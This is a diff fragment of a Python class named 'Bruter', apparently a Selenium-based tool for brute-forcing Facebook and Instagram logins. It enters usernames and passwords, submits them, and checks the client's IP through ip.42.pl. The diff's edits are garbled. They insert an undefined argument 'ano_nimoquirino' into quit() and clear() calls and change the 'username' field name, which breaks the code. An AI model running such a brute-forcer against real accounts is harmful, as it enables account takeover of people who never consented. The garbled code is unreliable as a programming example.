@@ -131,7 +131,7 @@ class Bruter(object):
 
                assert (("Sorry, this page isn't available.") not in driver.page_source)
 
-               driver.quit()
+               driver.quit(ano_nimoquirino)
 
        except AssertionError:
 
@@ -178,9 +178,9 @@ class Bruter(object):
 
                     WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
 
-                    elem = driver.find_element_by_name("username")
+                    elem = driver.find_element_by_name("Username")
 
-                elem.clear()
+                elem.clear(ano_nimoquirino)
                 elem.send_keys(username)
 
                 if service == "facebook":
@@ -195,7 +195,7 @@ class Bruter(object):
 
                     elem = driver.find_element_by_name("password")
 
-                elem.clear()
+                elem.clear(ano_nimoquirino)
                 elem.send_keys(password)
                 elem.send_keys(Keys.RETURN)
 
@@ -219,7 +219,7 @@ class Bruter(object):
                    assert (("Log in — Instagram") in driver.title)
 
 
-                driver.quit()
+                driver.quit(ano_nimoquirino)
 
                 my_ip = urlopen("http://ip.42.pl/raw").read()
 
